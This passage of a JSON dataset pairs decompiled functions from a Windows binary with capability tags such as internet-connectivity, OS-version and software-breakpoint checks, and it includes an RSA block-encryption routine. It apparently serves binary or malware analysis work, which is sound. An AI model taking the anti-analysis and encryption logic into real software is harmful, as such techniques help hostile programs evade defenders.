&stack0xfffffffc;\n    uVar9 = *(param_1 + 0x32);\n    if (uVar9 < 0x65) {\n        if (uVar9 == 100) {\ncode_r0x0040be40:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x0040be44:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x0040be47:\n            cVar5 = fcn.0040c54b(arg_8h, arg_ch_00);\n        }\n        else if (uVar9 < 0x59) {\n            if (uVar9 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x0040bdec:\n                arg_8h = 0x10;\n                goto code_r0x0040be47;\n            }\n            if (uVar9 != 0x41) {\n                if (uVar9 == 0x43) goto code_r0x0040be00;\n                if (uVar9 < 0x45) goto code_r0x0040bfce;\n                if (0x47 < uVar9) {\n                    if (uVar9 != 0x53) goto code_r0x0040bfce;\n                    goto code_r0x0040bdd4;\n                }\n            }\ncode_r0x0040be50:\n            cVar5 = fcn.0040c2b1();\n        }\n        else if (uVar9 == 0x5a) {\n            cVar5 = fcn.0040c0f4();\n        }\n        else {\n            if (uVar9 == 0x61) goto code_r0x0040be50;\n            if (uVar9 != 99) goto code_r0x0040bfce;\ncode_r0x0040be00:\n            cVar5 = fcn.0040c4b3(0);\n        }\n    }\n    else if (uVar9 < 0x71) {\n        if (uVar9 == 0x70) {\n            cVar5 = fcn.0040c728();\n        }\n        else {\n            if (uVar9 < 0x68) goto code_r0x0040be50;\n            if (uVar9 == 0x69) goto code_r0x0040be40;\n            if (uVar9 == 0x6e) {\n                cVar5 = fcn.0040c695();\n            }\n            else {\n                if (uVar9 != 0x6f) goto code_r0x0040bfce;\n                cVar5 = fcn.0040c709();\n            }\n        }\n    }\n    else {\n        if (uVar9 != 0x73) {\n            if (uVar9 != 0x75) {\n                if (uVar9 != 0x78) goto code_r0x0040bfce;\n                arg_ch_00 = 0;\n                goto code_r0x0040bdec;\n            }\n            goto code_r0x0040be44;\n        }\ncode_r0x0040bdd4:\n        cVar5 = fcn.0040c7b3();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0xc) != '\\0')) goto code_r0x0040bfce;\n    uVar8 = param_1[8];\n    uStack16 = 0;\n    uStack12 = 0;\n    arg_ch = 0;\n    if ((uVar8 >> 4 & 1) != 0) {\n        if ((uVar8 >> 6 & 1) == 0) {\n            if ((uVar8 & 1) == 0) {\n                if ((uVar8 >> 1 & 1) != 0) {\n                    uStack16 = 0x20;\n                    arg_ch = 1;\n                }\n                goto code_r0x0040bece;\n            }\n            uVar9 = 0x2b;\n        }\n        else {\n            uVar9 = 0x2d;\n        }\n        uStack16 = uVar9;\n        arg_ch = 1;\n    }\ncode_r0x0040bece:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar8 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&uStack16 + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (iVar1 == 0x41)) {\n            bVar3 = true;\n        }\n        else {\n            bVar3 = false;\n        }\n        *(&uStack16 + arg_ch * 2 + 2) = (!bVar3 - 1U & 0xe0) + 0x78;\n        arg_ch = arg_ch + 2;\n    }\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((uVar8 & 0xc) == 0) {\n        fcn.0040aacc(param_1 + 0x112, 0x20, arg_10h, param_1 + 6);\n    }\n    fcn.0040cc48(&uStack16, arg_ch, param_1 + 6, param_1[3]);\n    arg_14h = param_1 + 6;\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.0040aacc(param_1 + 0x112, 0x30, arg_10h, arg_14h);\n    }\n    fcn.0040ca9d(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.0040aacc(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n    }\ncode_r0x0040bfce:\n    uVar8 = fcn.0040640a(unaff_ESI);\n    return uVar8;\n}\n",
        "token_count": 2533
    },
    "0040bd81": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040bd81(int32_t param_1)\n\n{\n    int32_t *arg_14h;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t arg_ch;\n    uint unaff_ESI;\n    int32_t arg_10h;\n    uint16_t uVar6;\n    uint arg_8h;\n    uint arg_ch_00;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x424008 ^ &stack0xfffffffc;\n    uVar6 = *(param_1 + 0x32);\n    if (uVar6 < 0x65) {\n        if (uVar6 == 100) {\ncode_r0x0040be40:\n            *(param_1 + 0x20) = *(param_1 + 0x20) | 0x10;\ncode_r0x0040be44:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x0040be47:\n            cVar5 = fcn.0040c54b(arg_8h, arg_ch_00);\n        }\n        else if (uVar6 < 0x59) {\n            if (uVar6 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x0040bdec:\n                arg_8h = 0x10;\n                goto code_r0x0040be47;\n            }\n            if (uVar6 != 0x41) {\n                if (uVar6 == 0x43) goto code_r0x0040be00;\n                if (uVar6 < 0x45) goto code_r0x0040bfce;\n                if (0x47 < uVar6) {\n                    if (uVar6 != 0x53) goto code_r0x0040bfce;\n                    goto code_r0x0040bdd4;\n                }\n            }\ncode_r0x0040be50:\n            cVar5 = fcn.0040c2b1();\n        }\n        else if (uVar6 == 0x5a) {\n            cVar5 = fcn.0040c0f4();\n        }\n        else {\n            if (uVar6 == 0x61) goto code_r0x0040be50;\n            if (uVar6 != 99) goto code_r0x0040bfce;\ncode_r0x0040be00:\n            cVar5 = fcn.0040c4b3(0);\n        }\n    }\n    else if (uVar6 < 0x71) {\n        if (uVar6 == 0x70) {\n            cVar5 = fcn.0040c728();\n        }\n        else {\n            if (uVar6 < 0x68) goto code_r0x0040be50;\n            if (uVar6 == 0x69) goto code_r0x0040be40;\n            if (uVar6 == 0x6e) {\n                cVar5 = fcn.0040c695();\n            }\n            else {\n                if (uVar6 != 0x6f) goto code_r0x0040bfce;\n                cVar5 = fcn.0040c709();\n            }\n        }\n    }\n    else {\n        if (uVar6 != 0x73) {\n            if (uVar6 != 0x75) {\n                if (uVar6 != 0x78) goto code_r0x0040bfce;\n                arg_ch_00 = 0;\n                goto code_r0x0040bdec;\n            }\n            goto code_r0x0040be44;\n        }\ncode_r0x0040bdd4:\n        cVar5 = fcn.0040c7b3();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0x30) != '\\0')) goto code_r0x0040bfce;\n    uVar2 = *(param_1 + 0x20);\n    var_ch = 0;\n    var_8h._0_2_ = 0;\n    arg_ch = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    arg_ch = 1;\n                }\n                goto code_r0x0040bece;\n            }\n            uVar6 = 0x2b;\n        }\n        else {\n            uVar6 = 0x2d;\n        }\n        var_ch = uVar6;\n        arg_ch = 1;\n    }\ncode_r0x0040bece:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&var_ch + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (iVar1 == 0x41)) {\n            bVar3 = true;\n        }\n        else {\n            bVar3 = false;\n        }\n        *(&var_ch + arg_ch * 2 + 2) = (!bVar3 - 1U & 0xe0) + 0x78;\n        arg_ch = arg_ch + 2;\n    }\n    arg_10h = (*(param_1 + 0x24) - *(param_1 + 0x38)) - arg_ch;\n    if ((uVar2 & 0xc) == 0) {\n        fcn.0040aacc(param_1 + 0x448, 0x20, arg_10h, param_1 + 0x18);\n    }\n    fcn.0040cc48(&var_ch, arg_ch, param_1 + 0x18, *(param_1 + 0xc));\n    arg_14h = param_1 + 0x18;\n    if (((*(param_1 + 0x20) >> 3 & 1) != 0) && ((*(param_1 + 0x20) >> 2 & 1) == 0)) {\n        fcn.0040aacc(param_1 + 0x448, 0x30, arg_10h, arg_14h);\n    }\n    fcn.0040ca9d(0);\n    if ((-1 < *arg_14h) && ((*(param_1 + 0x20) >> 2 & 1) != 0)) {\n        fcn.0040aacc(param_1 + 0x448, 0x20, arg_10h, arg_14h);\n    }\ncode_r0x0040bfce:\n    fcn.0040640a(unaff_ESI);\n    return;\n}\n",
        "token_count": 1674
    },
    "0040c54b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040c54b(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t in_ECX;\n    uint32_t arg_ch_00;\n    bool bVar5;\n    \n    iVar1 = fcn.0040c035(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.0040f5be();\n                *puVar2 = 0x16;\n                uVar3 = fcn.004099f0();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x0040c5fc;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x0040c5fc;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x0040c5fc:\n    if ((((*(in_ECX + 0x20) >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar5 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar5);\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) | 0x40;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xfffffff7;\n        if (0x200 < *(in_ECX + 0x28)) {\n            *(in_ECX + 0x28) = 0x200;\n        }\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    if (iVar1 == 8) {\n        fcn.0040a9e7(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.0040a972(uVar3, arg_8h, arg_ch);\n    }\n    pcVar4 = *(in_ECX + 0x20) >> 7;\n    if (((pcVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (pcVar4 = *(in_ECX + 0x34),  *pcVar4 != '0')))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(pcVar4 >> 8, 1);\n}\n",
        "token_count": 1109
    },
    "0041005f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0041005f(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1dh;\n    \n    if (*(unaff_EBP + -0x1d) != '\\0') {\n        fcn.00411e87(3);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "00417f7e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nfloat10 fcn.00417f7e(double param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint arg_14h;\n    double dVar6;\n    double dVar7;\n    uchar in_XMM0 [16];\n    double dVar8;\n    double dVar9;\n    double dVar10;\n    double dVar11;\n    double dStack12;\n    \n    iVar4 = 0;\n    while( true ) {\n        uVar2 = SUB162(in_XMM0 >> 0x30, 0) >> 4;\n        dVar6 = SUB168(in_XMM0, 0) & *0x41ffb0 | *0x420020;\n        dVar7 = SUB168(in_XMM0, 0) & *0x41ffb8 | *0x420028;\n        uVar1 = SUB82(*0x41ffd0 + dVar6, 0) & 0x7f0;\n        dVar11 = *0x41ffe8 & dVar7;\n        dVar9 = (*0x41ffe0 & dVar6) * *(uVar1 + 0x4205e0) - *0x41ffc0;\n        dVar6 = (dVar6 - (*0x41ffe0 & dVar6)) * *(uVar1 + 0x4205e0);\n        dVar8 = (dVar7 - dVar11) * *(uVar1 + 0x4205e8);\n        dVar7 = dVar6 + dVar9;\n        dVar11 = dVar8 + (dVar11 * *(uVar1 + 0x4205e8) - *0x41ffc8);\n        uVar3 = uVar2 - 1;\n        if (uVar3 < 0x7fe) {\n            iVar4 = (uVar2 - 0x3ff) + iVar4;\n            dVar10 = iVar4;\n            iVar5 = 0;\n            if (uVar1 + iVar4 * 0x400 == 0) {\n                iVar5 = 0x10;\n            }\n            return ((*0x420078 * dVar11 + *0x420088) * dVar11 + *0x420098) * dVar11 * dVar11 +\n                   ((*0x420070 * dVar7 + *0x420080) * dVar7 + *0x420090) * dVar7 * dVar7 * dVar7 * dVar7 * dVar7 +\n                   *0x4200a0 * dVar7 + *(uVar1 + 0x4201d8) + dVar10 * *0x41fff8 + (dVar8 & *(iVar5 + 0x420008)) +\n                   *(uVar1 + 0x4201d0) + dVar9 + dVar10 * *0x41fff0 + (dVar6 & *(iVar5 + 0x420000));\n        }\n        dStack12 = -(*0x420030 == param_1);\n        if (SUB82(dStack12, 0) != 0) break;\n        if (uVar3 != 0xffffffff) {\n            if (uVar3 < 0x7ff) {\n                if (*0x420020 == (param_1 & *0x41ffb0 | *0x420020)) {\n                    return *0x420058;\n                }\n                arg_14h = 0x3e9;\n                dStack12 = *0x41ffb0;\n            }\n            else if (((uVar2 & 0x7ff) < 0x7ff) || ((SUB84(param_1, 0) | param_1 >> 0x20 & 0xfffff) == 0)) {\n                dStack12 = -NAN;\n                arg_14h = 9;\n            }\n            else {\n                arg_14h = 0x3e9;\n            }\n            goto code_r0x0041818a;\n        }\n        in_XMM0 = CONCAT88(dVar11, param_1 * *0x420040);\n        iVar4 = -0x34;\n    }\n    arg_14h = 8;\n    dStack12 = *0x420050;\ncode_r0x0041818a:\n    fcn.004187d3(&param_1, &param_1, &dStack12, arg_14h);\n    return dStack12;\n}\n",
        "token_count": 1005
    },
    "0040af43": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __thiscall\nfcn.0040af43(int32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7)\n\n{\n    uint arg_ch;\n    char cVar1;\n    uint *puVar2;\n    uint32_t arg_8h;\n    uint uVar3;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    \n    cVar1 = fcn.0040c867();\n    if (cVar1 == '\\0') {\n        return 0xffffffff;\n    }\n    if (*(param_1 + 0x10) == 0) {\ncode_r0x0040af68:\n        puVar2 = fcn.0040f5be();\n        *puVar2 = 0x16;\n        fcn.004099f0();\n    }\n    else {\n        do {\n            *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n            if (*(param_1 + 0x450) == 2) {\n                return *(param_1 + 0x18);\n            }\n            *(param_1 + 0x38) = 0;\n            *(param_1 + 0x1c) = 0;\ncode_r0x0040b010:\n            cVar1 = **(param_1 + 0x10);\n            *(param_1 + 0x31) = cVar1;\n            if (cVar1 != '\\0') {\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n                if (*(param_1 + 0x18) < 0) goto code_r0x0040b023;\n                arg_ch = *(param_1 + 0x1c);\n                arg_8h = *(param_1 + 0x31);\n                uVar3 = fcn.0040adc4(arg_8h, arg_ch);\n                *(param_1 + 0x1c) = uVar3;\n    // switch table (8 cases) at 0x40b04b\n                switch(uVar3) {\n                case 0:\n                    cVar1 = fcn.0040b325();\n                    break;\n                case 1:\n                    *(param_1 + 0x28) = 0xffffffff;\n                    *(param_1 + 0x24) = 0;\n                    *(param_1 + 0x30) = 0;\n                    *(param_1 + 0x20) = 0;\n                    *(param_1 + 0x2c) = 0;\n                    *(param_1 + 0x3c) = 0;\n                    goto code_r0x0040b010;\n                case 2:\n                    cVar1 = fcn.0040b2ab();\n                    break;\n                case 3:\n                    cVar1 = fcn.0040bfde();\n                    break;\n                case 4:\n                    goto code_r0x0040afea;\n                case 5:\n                    cVar1 = fcn.0040b443();\n                    break;\n                case 6:\n                    cVar1 = fcn.0040b494();\n                    break;\n                case 7:\n                    cVar1 = fcn.0040b8f5(arg_8h, arg_ch, arg_8h, unaff_ESI, unaff_retaddr, param_2, param_3, param_4, \n                                         param_5, param_6, param_7);\n                    break;\n                case 0xbad1abe1:\n                    goto code_r0x0040b048;\n                default:\n                    goto code_r0x0040af68;\n                }\n                if (cVar1 == '\\0') {\n                    return 0xffffffff;\n                }\n                goto code_r0x0040b010;\n            }\n            *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\ncode_r0x0040b023:\n            cVar1 = fcn.0040c882();\n        } while (cVar1 != '\\0');\n    }\ncode_r0x0040b048:\n    return 0xffffffff;\ncode_r0x0040afea:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0040b010;\n}\n",
        "token_count": 965
    },
    "0040b06b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040b06b(int32_t param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    cVar2 = fcn.0040c867();\n    if (cVar2 == '\\0') {\n        return 0xffffffff;\n    }\n    if (*(param_1 + 0x10) == 0) {\ncode_r0x0040b090:\n        puVar3 = fcn.0040f5be();\n        *puVar3 = 0x16;\n        fcn.004099f0();\ncode_r0x0040b0a0:\n        uVar4 = 0xffffffff;\n    }\n    else {\ncode_r0x0040b150:\n        *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n        if (*(param_1 + 0x450) != 2) {\n            *(param_1 + 0x38) = 0;\n            *(param_1 + 0x1c) = 0;\ncode_r0x0040b139:\n            iVar1 = **(param_1 + 0x10);\n            *(param_1 + 0x32) = iVar1;\n            if (iVar1 != 0) {\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n                if (*(param_1 + 0x18) < 0) goto code_r0x0040b150;\n                uVar4 = fcn.0040adf9(*(param_1 + 0x32), *(param_1 + 0x1c));\n                *(param_1 + 0x1c) = uVar4;\n    // switch table (8 cases) at 0x40b16b\n                switch(uVar4) {\n                case 0:\n                    cVar2 = fcn.0040b344();\n                    break;\n                case 1:\n                    *(param_1 + 0x28) = 0xffffffff;\n                    *(param_1 + 0x24) = 0;\n                    *(param_1 + 0x30) = 0;\n                    *(param_1 + 0x20) = 0;\n                    *(param_1 + 0x2c) = 0;\n                    *(param_1 + 0x3c) = 0;\n                    goto code_r0x0040b139;\n                case 2:\n                    cVar2 = fcn.0040b2e8();\n                    break;\n                case 3:\n                    cVar2 = fcn.0040c009();\n                    break;\n                case 4:\n                    goto code_r0x0040b113;\n                case 5:\n                    cVar2 = fcn.0040b46b();\n                    break;\n                case 6:\n                    cVar2 = fcn.0040b5fd();\n                    break;\n                case 7:\n                    cVar2 = fcn.0040bb24();\n                    break;\n                case 0xbad1abe1:\n                    goto code_r0x0040b0a0;\n                default:\n                    goto code_r0x0040b090;\n                }\n                if (cVar2 == '\\0') goto code_r0x0040b0a0;\n                goto code_r0x0040b139;\n            }\n            *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n            goto code_r0x0040b150;\n        }\n        uVar4 = *(param_1 + 0x18);\n    }\n    return uVar4;\ncode_r0x0040b113:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0040b139;\n}\n",
        "token_count": 849
    },
    "0040b18b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040b18b(int32_t param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    cVar2 = fcn.0040c867();\n    if (cVar2 == '\\0') {\n        return 0xffffffff;\n    }\n    if (*(param_1 + 0x10) == 0) {\ncode_r0x0040b1b0:\n        puVar3 = fcn.0040f5be();\n        *puVar3 = 0x16;\n        fcn.004099f0();\ncode_r0x0040b1c0:\n        uVar4 = 0xffffffff;\n    }\n    else {\ncode_r0x0040b270:\n        *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n        if (*(param_1 + 0x450) != 2) {\n            *(param_1 + 0x38) = 0;\n            *(param_1 + 0x1c) = 0;\ncode_r0x0040b259:\n            iVar1 = **(param_1 + 0x10);\n            *(param_1 + 0x32) = iVar1;\n            if (iVar1 != 0) {\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n                if (*(param_1 + 0x18) < 0) goto code_r0x0040b270;\n                uVar4 = fcn.0040adf9(*(param_1 + 0x32), *(param_1 + 0x1c));\n                *(param_1 + 0x1c) = uVar4;\n    // switch table (8 cases) at 0x40b28b\n                switch(uVar4) {\n                case 0:\n                    cVar2 = fcn.0040b363();\n                    break;\n                case 1:\n                    *(param_1 + 0x28) = 0xffffffff;\n                    *(param_1 + 0x24) = 0;\n                    *(param_1 + 0x30) = 0;\n                    *(param_1 + 0x20) = 0;\n                    *(param_1 + 0x2c) = 0;\n                    *(param_1 + 0x3c) = 0;\n                    goto code_r0x0040b259;\n                case 2:\n                    cVar2 = fcn.0040b2e8();\n                    break;\n                case 3:\n                    cVar2 = fcn.0040c009();\n                    break;\n                case 4:\n                    goto code_r0x0040b233;\n                case 5:\n                    cVar2 = fcn.0040b46b();\n                    break;\n                case 6:\n                    cVar2 = fcn.0040b779();\n                    break;\n                case 7:\n                    cVar2 = fcn.0040bd81();\n                    break;\n                case 0xbad1abe1:\n                    goto code_r0x0040b1c0;\n                default:\n                    goto code_r0x0040b1b0;\n                }\n                if (cVar2 == '\\0') goto code_r0x0040b1c0;\n                goto code_r0x0040b259;\n            }\n            *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n            goto code_r0x0040b270;\n        }\n        uVar4 = *(param_1 + 0x18);\n    }\n    return uVar4;\ncode_r0x0040b233:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0040b259;\n}\n",
        "token_count": 852
    },
    "00406ee2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406ee2(int32_t **arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    \n    piVar1 = *arg_8h;\n    if (((*piVar1 == -0x1f928c9d) && (piVar1[4] == 3)) &&\n       ((iVar2 = piVar1[5],  iVar2 == 0x19930520 ||\n        (((iVar2 == 0x19930521 || (iVar2 == 0x19930522)) || (iVar2 == 0x1994000)))))) {\n        fcn.0040d100();\n        pcVar3 = swi(3);\n        uVar4 = (*pcVar3)();\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 195
    },
    "00401cd0": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00401cd0(uchar *arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uchar *arg_8h_01;\n    uint *puVar2;\n    int32_t arg_8h_02;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t in_EDX;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint unaff_ESI;\n    uint *puVar9;\n    int32_t in_stack_0000032c;\n    uint in_stack_fffff30c;\n    uint auStack2512 [196];\n    uint uStack1728;\n    int32_t var_684h;\n    int32_t var_680h;\n    int32_t var_67ch;\n    uint32_t var_678h;\n    uchar *var_674h;\n    uint var_670h;\n    int32_t var_66ch;\n    uint32_t var_668h;\n    int32_t var_664h;\n    uint var_65dh;\n    int32_t var_334h;\n    uint var_330h;\n    uint32_t var_8h;\n    \n    var_8h = *0x424008 ^ &stack0xfffffffc;\n    var_674h = arg_8h;\n    arg_8h_00 = fcn.00406657();\n    var_680h = fcn.004043b0(arg_8h_00, arg_ch * 4);\n    fcn.00406652();\n    var_668h = 0;\n    var_664h = 0;\n    if (in_EDX == 0) {\n        *arg_8h = 0;\n        fcn.0040640a(unaff_ESI);\n        return;\n    }\n    var_684h = var_680h + -1;\n    var_67ch = in_ECX;\n    var_678h = in_EDX;\ncode_r0x00401d52:\n    var_65dh._0_1_ = fcn.00401960(1, 0xff);\n    var_66ch = var_684h;\n    if (var_678h - var_668h < var_684h) {\n        var_66ch = var_678h - var_668h;\n    }\n    iVar8 = var_66ch + 1;\ncode_r0x00401d78:\n    arg_8h_01 = fcn.00406657();\n    *arg_8h_01 = var_65dh;\n    puVar7 = arg_8h_01;\n    for (uVar3 = var_668h; uVar3 < (var_668h - 1) + iVar8; uVar3 = uVar3 + 1) {\n        puVar7 = puVar7 + 1;\n        *puVar7 = *(uVar3 + var_67ch);\n    }\n    puVar2 = fcn.004021f0(arg_8h_01, iVar8);\n    puVar9 = &fcn.00401cd0::var_334h;\n    for (iVar4 = 0xc9; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar9 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    if (var_334h == arg_ch) {\n        iVar4 = 0;\n        if (0 < var_334h) {\n            do {\n                if ((&fcn.00401cd0::var_330h)[iVar4] != (&fcn.00401cd0::arg_10h)[iVar4]) goto code_r0x00401e05;\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < var_334h);\n        }\n    }\n    else {\ncode_r0x00401e05:\n        cVar1 = fcn.00402c30();\n        if (cVar1 == '\\0') goto code_r0x00401e54;\n    }\n    fcn.00406652();\n    var_66ch = var_66ch + -1;\n    iVar8 = iVar8 + -1;\n    if (var_66ch < 1) {\n        uStack1728 = 0x401e4c;\n        fcn.0040a1e7(L\"blockSize > 0\", L\"Crypto\\\\rsa.cpp\", 0x4f);\n    }\n    goto code_r0x00401d78;\ncode_r0x00401e54:\n    var_668h = var_668h + var_66ch;\n    puVar2 = &stack0xfffff630;\n    puVar9 = puVar2;\n    for (iVar8 = 200; iVar8 != 0; iVar8 